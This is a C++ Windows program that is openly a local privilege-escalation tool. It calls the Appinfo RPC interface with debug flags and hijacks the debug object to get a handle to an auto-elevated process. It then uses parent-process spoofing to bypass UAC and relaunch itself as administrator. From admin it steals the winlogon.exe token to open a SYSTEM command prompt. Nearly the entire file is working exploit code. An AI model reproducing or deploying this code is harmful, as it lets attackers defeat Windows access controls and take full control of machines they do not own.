#include <iostream>

#include <windows.h>
#include <TlHelp32.h>
#include <processthreadsapi.h>
#include <rpc.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Rpcrt4.lib")

extern "C" {
    void* __RPC_USER MIDL_user_allocate(size_t size) {
        return malloc(size);
    }
    void __RPC_USER MIDL_user_free(void* ptr) {
        free(ptr);
    }
#include "appinfo64.h"

    NTSTATUS NTAPI NtQueryInformationProcess(
        HANDLE ProcessHandle,
        DWORD ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    NTSTATUS NTAPI NtRemoveProcessDebug(
        HANDLE ProcessHandle,
        HANDLE DebugObjectHandle
    );

    void NTAPI DbgUiSetThreadDebugObject(
        HANDLE DebugObject
    );

    NTSTATUS NTAPI NtDuplicateObject(
        HANDLE SourceProcessHandle,
        HANDLE SourceHandle,
        HANDLE TargetProcessHandle,
        PHANDLE TargetHandle,
        ACCESS_MASK DesiredAccess,
        ULONG HandleAttributes,
        ULONG Options
    );
}

// ntstatus and process information class

#ifndef ProcessDebugObjectHandle
#define ProcessDebugObjectHandle (PROCESSINFOCLASS)0x1E
#endif
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

DWORD modsize;
void* addr;
HANDLE h;
DWORD pid;
std::wstring target = L"winlogon.exe";
DWORD getpid() {

    h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h == INVALID_HANDLE_VALUE) {
        std::cerr << "failed 1: " << GetLastError() << std::endl;
        return 0;
    }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(h, &pe)) {
        do {
            if (std::wstring(pe.szExeFile) == target) {
                pid = pe.th32ProcessID;

                break;
            }


        } while (Process32Next(h, &pe));
        CloseHandle(h);
    }


    else {
        std::cout << " process 32 first failed." << GetLastError() << std::endl;
        CloseHandle(h);
        return 0;
    }

    if (pid) {
        return pid;
    }
    else {
        std::cout << "failed to find target's pid, exiting.";
        return 0;
    }

}

void enabletoken() {
    HANDLE thishandle = GetCurrentProcess();
    HANDLE hToken;
    bool success = OpenProcessToken(
        thishandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    if (!success) {
        std::cout << "failed to get token" << std::endl;
        return;
    }
    std::cout << "got token." << std::endl;
    LUID luid;
    bool looksuccess = LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid);
    if (!looksuccess) {
        std::cout << "failed to lookup privilege value." << std::endl;
        return;
    }
    std::cout << "got LUID" << std::endl;
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bool adjustsuccess = AdjustTokenPrivileges(
        hToken, false, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (!adjustsuccess) {
        std::cout << "failed to adjust token privileges." << std::endl;
        return;
    }
    std::cout << "Enabled SeDebugPrivileges successfully." << std::endl;
}

HANDLE StealSystemToken() {
    HANDLE winH = OpenProcess(PROCESS_QUERY_INFORMATION, false, getpid());
    if (winH == NULL) {
        auto error = GetLastError();
        std::cout << "failed to get handle to winlogon.exe. error: " << error
            << std::endl;
        return NULL;
    }
    std::cout << "got handle to winlogon.exe" << std::endl;
    HANDLE hToken;
    bool taketoken = OpenProcessToken(winH, TOKEN_DUPLICATE, &hToken);
    if (!taketoken) {
        std::cout << "failed to duplicate token from winlogon.exe." << std::endl;
        CloseHandle(winH);
        return NULL;
    }

    std::cout << "successfully duplicated token from winlogon.exe" << std::endl;
    return hToken;
}

void LaunchSystemCmd(HANDLE winHandle) {
    HANDLE newT;
    bool dupesuccess =
        DuplicateTokenEx(winHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
            TokenPrimary, &newT);
    if (!dupesuccess) {
        std::cout << "failed to dupe winlogon token handle." << std::endl;
        CloseHandle(winHandle);
        return;
    }
    std::cout << "duped winlogon token handle." << std::endl;
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    bool createsuccess = CreateProcessWithTokenW(
        newT, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0,
        NULL, NULL, &si, &pi);

    if (!createsuccess) {
        std::cout << "failed to create cmd." << std::endl;
        CloseHandle(newT);
        CloseHandle(winHandle);
        return;
    }
    std::cout << "successfully created new system cmd. im fucking amazing"
        << std::endl;

    CloseHandle(newT);
    CloseHandle(winHandle);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}



int main()
{
    HANDLE hToken;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD dwlength;
        GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwlength);
        PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwlength);
        if (pTIL) {
            if (GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwlength, &dwlength)) {
                
                DWORD dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
                    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

                if (dwIntegrityLevel < SECURITY_MANDATORY_MEDIUM_RID) {
                    std::cout << "integrity is TOO LOW, exiting..";
                    return 0;
                }
                else if (dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
                    std::cout << "running as normal user, now lets get admin." << std::endl;
                }
                else if (dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID) {
                    std::cout << "Running as admin now. Stealing system token and respawning with a new CMD console\n";
                    enabletoken();
                    HANDLE winH = StealSystemToken();
                    LaunchSystemCmd(winH);
                    return 0;
                }
                else {
                    std::cout << "running as system, exiting..";
                    return 0;
                }
            }
            LocalFree(pTIL);
        }
        CloseHandle(hToken);

    }

    APP_STARTUP_INFO AppStartupInfo;
    APP_PROCESS_INFORMATION AppProcessInfo;
    RPC_ASYNC_STATE RPCAsyncState;
    RPC_BINDING_HANDLE RpcBindingHandle;

    RpcBindingHandle = NULL;
    ZeroMemory(&AppStartupInfo, sizeof(APP_STARTUP_INFO));
    ZeroMemory(&AppProcessInfo, sizeof(APP_PROCESS_INFORMATION));
    ZeroMemory(&RPCAsyncState, sizeof(RPC_ASYNC_STATE));

    std::cout << "Hello World!\n";

    RPC_WSTR stringbind = nullptr;
    RPC_STATUS rpcstatus = RpcStringBindingComposeW((RPC_WSTR)L"201ef99a-7fa0-444c-9399-19ba84f12a1a", (RPC_WSTR)L"ncalrpc", nullptr, nullptr, nullptr, &stringbind);
    if (rpcstatus == RPC_S_INVALID_STRING_UUID) {
        std::cout << "failed to string bind" << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "successfully binded string" << std::endl;

    RPC_STATUS newrpcstat = RpcBindingFromStringBindingW(stringbind, &RpcBindingHandle);
    if (newrpcstat != RPC_S_OK) {
        std::cout << "failed to bind from string binding" << newrpcstat << std::endl;
        return 1;
    }
    std::cout << "binded from string binding successfully" << std::endl;

    NTSTATUS status = RpcStringFreeW(&stringbind);
    DWORD cbSid = SECURITY_MAX_SID_SIZE;
    PSID SystemSid = malloc(cbSid);

    CreateWellKnownSid(WinLocalSystemSid, NULL, SystemSid, &cbSid);

    RPC_SECURITY_QOS_V3 sqos;
    ZeroMemory(&sqos, sizeof(sqos));
    sqos.Version = 3;
    sqos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
    sqos.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
    sqos.Sid = SystemSid;

    RPC_STATUS stat = RpcBindingSetAuthInfoExW(RpcBindingHandle, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, NULL, 0, (RPC_SECURITY_QOS*)&sqos);
    if (stat != RPC_S_OK) {
        std::cout << "failed to setauthinfo" << std::endl;
        return 1;
    }

    HANDLE h = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (h == NULL) {
        std::cout << "failed to create event" << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "created event" << h << std::endl;

    RPC_STATUS asyncStat = RpcAsyncInitializeHandle(&RPCAsyncState, sizeof(RPC_ASYNC_STATE));
    if (asyncStat != RPC_S_OK) {
        std::cout << "failed to initialize async handle: " << asyncStat << std::endl;
        CloseHandle(h);
        return 1;
    }
    RPCAsyncState.NotificationType = RpcNotificationTypeEvent;
    RPCAsyncState.u.hEvent = h;
    std::cout << "RPC Async State initialized" << std::endl;

    // part 2
    STARTUPINFOA si;
    si.cb = sizeof(STARTUPINFOA);
    long elevationtype = 0;
    LPVOID wait = nullptr;

    AppStartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    AppStartupInfo.wShowWindow = SW_HIDE;

    RAiLaunchAdminProcess(&RPCAsyncState, RpcBindingHandle, (wchar_t*)L"C:\\Windows\\System32\\winver.exe", (wchar_t*)L"C:\\Windows\\System32\\winver.exe", 0, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, (wchar_t*)L"C:\\Windows", (wchar_t*)L"WinSta0\\Default", &AppStartupInfo, 0, INFINITE, &AppProcessInfo, &elevationtype);
    WaitForSingleObject(RPCAsyncState.u.hEvent, INFINITE);
    RpcAsyncCompleteCall(&RPCAsyncState, &wait);

    std::cout << "successfully created dummy app. PID: " << AppProcessInfo.ProcessId << std::endl;

    HANDLE winverhandle = (HANDLE)AppProcessInfo.ProcessHandle;

    HANDLE debugobj = NULL;

    NTSTATUS newstatus1 = NtQueryInformationProcess(winverhandle, 30, &debugobj, sizeof(HANDLE), NULL);
    if (NT_SUCCESS(newstatus1) && debugobj) {
        std::cout << "got Debug Object Handle: " << debugobj << std::endl;
    }
    else {
        std::cout << "failed to get debug object handle." << std::endl;
        CloseHandle(winverhandle);
        return 1;
    }

    NTSTATUS newstatus = NtRemoveProcessDebug(winverhandle, debugobj);
    if (!NT_SUCCESS(newstatus)) {
        std::cout << "failed to Run NtRemoveProcessDebug." << std::endl;
        CloseHandle(winverhandle);
        CloseHandle(debugobj);
    }
    std::cout << "successfully removed process debug." << std::endl;

    if (!TerminateProcess(winverhandle, 0)) {
        std::cout << "failed to kill dummy process. " << GetLastError() << std::endl;
        CloseHandle(winverhandle);
        CloseHandle(debugobj);
        return 1;
    }

    std::cout << "killed the dummy process" << std::endl;
    CloseHandle(winverhandle);

    // part 3
    DbgUiSetThreadDebugObject(debugobj);

    RpcAsyncInitializeHandle(&RPCAsyncState, sizeof(RPC_ASYNC_STATE));
    RPCAsyncState.NotificationType = RpcNotificationTypeEvent;
    RPCAsyncState.u.hEvent = h;

    RAiLaunchAdminProcess(&RPCAsyncState, RpcBindingHandle, (wchar_t*)L"C:\\Windows\\System32\\ComputerDefaults.exe", (wchar_t*)L"C:\\Windows\\System32\\ComputerDefaults.exe", 1, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, (wchar_t*)L"C:\\Windows", (wchar_t*)L"WinSta0\\Default", &AppStartupInfo, 0, INFINITE, &AppProcessInfo, &elevationtype);
    std::cout << "RAiLaunchAdminProcess called" << std::endl;

    std::cout << "waiting for Appinfo to respond..." << std::endl;
    WaitForSingleObject(RPCAsyncState.u.hEvent, INFINITE);
    RPC_STATUS completeStat = RpcAsyncCompleteCall(&RPCAsyncState, &wait);
    if (completeStat == RPC_S_OK) {
        std::cout << "Elevated process created!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" << AppProcessInfo.ProcessId << std::endl;
    }
    else {
        CloseHandle(debugobj);
        std::cout << "Completion failed with status: " << completeStat << std::endl;
        return 1;
    }
    DEBUG_EVENT dbgevent;
    ZeroMemory(&dbgevent, sizeof(DEBUG_EVENT));

    bool keeplooping = true;
    HANDLE elevatedprocessH = NULL;
    std::cout << "trying to get handle to process, its a loop so if it freezes, you know why.." << std::endl;

    while (keeplooping) {
        if (!WaitForDebugEvent(&dbgevent, INFINITE)) {
            break;
        }

        if (dbgevent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
            elevatedprocessH = dbgevent.u.CreateProcessInfo.hProcess;
            std::cout << "Got handle to the process: " << elevatedprocessH << std::endl;
            keeplooping = false;
        }
        else {
            ContinueDebugEvent(dbgevent.dwProcessId, dbgevent.dwThreadId, DBG_CONTINUE);
        }
    }

    HANDLE newelevatedprocess;

    NtDuplicateObject(elevatedprocessH, GetCurrentProcess(), GetCurrentProcess(), &newelevatedprocess, PROCESS_ALL_ACCESS, 0, 0);

    SIZE_T size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
    InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &size);
    if (!UpdateProcThreadAttribute(
        lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &newelevatedprocess,
        sizeof(HANDLE),
        NULL,
        NULL
    )) {
        std::cout << "failed to update thread attribute" << GetLastError();
        CloseHandle(debugobj);
        return 1;
    }
    std::cout << "updated proccess thread attribute." << std::endl;

    STARTUPINFOEXW sia;
    ZeroMemory(&sia, sizeof(STARTUPINFOEXW));
    sia.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    sia.lpAttributeList = lpAttributeList;
    sia.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    sia.StartupInfo.wShowWindow = SW_SHOW;
    sia.StartupInfo.lpDesktop = (LPWSTR)L"WinSta0\\Default";


    PROCESS_INFORMATION pinew;
    ZeroMemory(&pinew, sizeof(PROCESS_INFORMATION));

    wchar_t buffer[MAX_PATH];
    GetModuleFileNameW(NULL, buffer, MAX_PATH);


    if (CreateProcessW(buffer, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&sia, &pinew)) {
        std::cout << "successfully restarted as admin, our new pid is: " << pinew.dwProcessId << std::endl;

    }
    else {
        std::cout << "failed to restart" << GetLastError() << std::endl;
    }

    CloseHandle(debugobj);
}